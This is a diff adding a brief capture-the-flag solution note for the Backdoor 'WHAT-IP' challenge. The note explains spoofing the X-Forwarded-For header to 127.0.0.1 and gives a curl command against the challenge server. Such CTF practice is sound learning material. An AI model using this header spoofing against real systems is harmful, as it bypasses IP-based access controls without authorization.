@@ -1,0 +1,5 @@
+https://backdoor.sdslabs.co/challenges/WHAT-IP
+
+Edit the request headers using '--header' flag in the curl command and set ip to localhost ip 127.0.0.1
+
+curl --header "X-Forwarded-For: 127.0.0.1" http://hack.bckdr.in:16003/index.php
